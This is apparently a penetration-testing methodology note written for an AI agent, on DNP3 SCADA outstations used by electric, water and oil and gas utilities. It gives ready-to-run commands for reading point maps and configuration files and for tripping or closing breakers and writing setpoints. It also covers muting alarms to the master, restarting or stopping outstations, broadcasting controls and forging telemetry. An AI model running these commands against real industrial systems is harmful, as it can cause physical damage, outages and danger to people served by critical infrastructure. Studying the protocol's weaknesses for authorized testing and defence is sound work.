---
technology: "DNP3 (IEEE 1815)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
role: implementation-variant
layer: SCADA master/outstation protocol over TCP+UDP 20000 (serial behind terminal servers/radio); optional DNP3-TLS
standards: "IEEE 1815 (DNP3), DNP3 Secure Authentication v5 (SAv5)"
status: upstream-only
source: "rewritten from HackTricks (src/network-services-pentesting/20000-pentesting-dnp3.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "upstream-only (HackTricks + primary sources); zero corpus evidence by design. Frame/group/function facts pinned to the IEEE 1815 object and function-code set; opendnp3 checked as the reference stack. No nmap NSE for DNP3 exists — confirmed against the nmap script catalog. Bucket-2 new-unit wave 1, 2026-11-13."
---

# DNP3 — implementation methodology

Companion router: [[ics|ICS area router]]. DNP3 is the SCADA protocol of North American
electric utilities and a staple of water/wastewater and oil & gas: a **master** polls
**outstations** (RTUs/IEDs) for telemetry and issues control commands; outstations may push
**unsolicited responses**. Plaintext TCP/UDP 20000, no authentication and no encryption by
default. Link and application addresses are plain numbers on the wire — address discovery is
half of this methodology.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Link-status probe / range scan | none | yes | Live outstation + link address — Info |
| Class-0 integrity poll | none | yes | Complete point map in one request — High |
| Device attributes (Group 0) | none | yes | Vendor/model + point ranges — Info |
| File transfer reads (Group 70) | usually none | yes | Configs and logs off the outstation — High |
| Control (CROB / analog out) | **authorization only**, explicit outstation addr | yes | Trip/close breakers, setpoints — Critical |
| Unsolicited-response forgery (0x82) | origin validation absent | any-sender | False telemetry into the master — High |
| Restart / stop / disable-unsolicited | **authorization only** | yes | Availability takedowns — High |

## Phase 0 — Fingerprint (and why nmap alone stops here)

```bash
nmap -p 20000 --open -sV 198.51.100.10    # version probe recognizes DNP3; no text banner
```

The official nmap tree ships **no DNP3 NSE script** (unlike modbus-discover, s7-info,
enip-info, iec-identify, iec61850-mms) — identity and point dumps need a real DNP3 client.
Stack shape for reading the wire: every frame starts with FT3 sync `0x0564`, carries 16-bit
**source and destination link addresses** (0–65519; `0xFFFF` broadcast, `0xFFFC` self),
per-block CRCs; a 1-byte transport header fragments application messages (≤250 bytes); the
application layer carries function codes and objects. The CRC (poly `0x3D65`) corrects noise
only — an on-path attacker recomputes it, so it is not integrity.

## Phase 1 — Passive recon

```bash
dnp3                                  # all DNP3
dnp3.al.func == 1                     # Read / == 2 Write
dnp3.al.func == 5                     # Direct Operate (control, no select)
dnp3.al.func == 3 || dnp3.al.func == 4 # Select / Operate (SBO pair)
dnp3.al.func == 130                   # Unsolicited Response (outstation-initiated)
dnp3.src == 1 && dnp3.dst == 1024     # follow one master<->outstation pair
```

One capture hands you the valid **master address** and **outstation address** to impersonate,
the point map, control history, and any bad-CRC frames (corruption or injection on a live
link). oida's pcap mode (`oida pcap capture.pcap --protocols dnp3`) pairs masters with
outstations and separates monitoring from control traffic per session.

## Phase 2 — Read-only enumeration

Addressing model: objects are **Group + Variation + Index** — group = data type (1/2 binary
input static/event, 3/4 double-bit, 10/11 binary output, 12 CROB, 20–23 counters, 30/32 analog
input, 40/41 analog output status/command, 50/51 time, 60 class data, 70 files, 80 internal
indications, 110/111 octet strings, 120/121 Secure Auth). Variation 0 = "answer with your
preferred encoding". **Class 0** = all static data; **1/2/3** = buffered events; the classic
integrity poll (0+1+2+3) returns the whole point map in one request. Every response carries
the 2-byte **IIN** status word — `OBJECT_UNKNOWN`/`FUNC_NOT_IMPL` bits are your
supported-or-refused oracle.

```bash
oida dnp3 198.51.100.10                  # connect + integrity poll + device attributes
oida dnp3 198.51.100.10 -r 1-100         # scan link-address range for outstations
oida dnp3 198.51.100.10 -a               # device attributes (g0v255): vendor/model
oida dnp3 198.51.100.10 -e               # point ranges from device attributes
oida dnp3 198.51.100.10 --probe-objects  # probe groups 0-122 (read-only)
oida dnp3 198.51.100.10 -g 30.0          # one group/variation read
oida dnp3 198.51.100.10 -o 10 -l /       # file transfer: list directory
oida dnp3 198.51.100.10 -o 10 -R /config.txt -s loot.txt   # pull a file
```

Install extra `oida-ics[dnp3]` (built on yadnp3 over opendnp3). Defaults: master address 1,
outstation 1024 — read-only discovery runs on those; control requires setting the outstation
address explicitly. A bare TCP connect is not proof: the tool only reports DNP3 on a parsed
application-layer response. Group 70 file reads are frequently left open with no
authentication — configuration and logs straight off the RTU.

## Phase 3 — Control and availability primitives (gated, address required)

Everything here changes or can stop a live process — oida demands both `--confirm` and an
explicit outstation address:

```bash
oida dnp3 198.51.100.10 -o 10 --bo-direct 0 --control-code 6 --confirm   # CROB TRIP
oida dnp3 198.51.100.10 -o 10 --bo-sbo 0 --control-code 5 --confirm      # SBO CLOSE
oida dnp3 198.51.100.10 -o 10 --ao-direct 0 --ao-value 42 --confirm      # analog setpoint
oida dnp3 198.51.100.10 -o 10 --disable-unsol --confirm                  # mute alarms
oida dnp3 198.51.100.10 -o 10 --time-sync lan --confirm                  # clock write
oida dnp3 198.51.100.10 -o 10 --cold-restart --confirm                   # reset outstation
oida dnp3 198.51.100.10 -o 10 -K --confirm                               # Stop Application
```

Control semantics that decide whether a command moves anything:

- **CROB codes**: 1 PULSE_ON, 2 PULSE_OFF, 3 LATCH_ON, 4 LATCH_OFF, 5 CLOSE, 6 TRIP — on a
  breaker point, 6 is an open.
- **Two control models**: Direct Operate acts in one message; Select-then-Operate arms the
  point first. Relays that accept only SBO make a lone Direct Operate *silently do nothing* —
  check the point's model before concluding an output is not writable.
- **Availability primitives are first-class function codes**: Stop Application, Cold/Warm
  Restart, Disable Unsolicited (silences alarm reporting to the real master), no-acknowledge
  Freeze variants for quiet counter tampering.
- **Broadcast `0xFFFF`** fans one control message across every outstation on the segment.
- **SAv5** (Group 120, `--sa --sa-user <id> --sa-key <hex>`) authenticates but does not
  encrypt, and is rarely deployed; TLS mode requires both cert and key or the tool refuses to
  fall back to cleartext.

## Phase 4 — Manual data-link probing

When a range scan is too noisy, one hand-built frame confirms life and the link address —
Request Link Status (FC 9) to dest 1024, src 1:

```text
05 64 05 C9 00 04 01 00 98 81
# sync 0x0564 | len | control 0xC4+FC9 | dst 0x0400 LE | src 0x0001 | CRC
# A live outstation answers LINK_STATUS (FC 0x0B).
```

opendnp3 is the reference stack for anything scripted beyond this — full master and outstation
state machines, selects/operates, file transfer, SAv5. Impact framing follows the protocol
trust model: unauth point-map read, unauth physical control where SAv5 is absent, forged
unsolicited responses injecting readings into the master, replay, and vendor-extension groups
80–127 as an ungated surface that DPI rules written for groups 1–79 never see. ATT&CK for ICS:
T1692.001 command messages, T0814 denial of service.

## Command quick reference

```bash
nmap -p 20000 --open -sV 198.51.100.10     # presence only
oida dnp3 198.51.100.10                    # integrity poll + attributes
oida dnp3 198.51.100.10 -r 1-100           # outstation address scan
tshark -r capture.pcap -Y 'dnp3.al.func == 5'    # control on the wire
```

## Tool mapping (prose)

nmap for the port/version fingerprint (no NSE exists); the oida ICS scanner's dnp3 module
(yadnp3/opendnp3) for polling, probing, file reads, and confirm-gated control; opendnp3 as the
reference stack for manual state-machine work; Wireshark/tshark for passive decoding. Tools
vault owns per-tool detail.
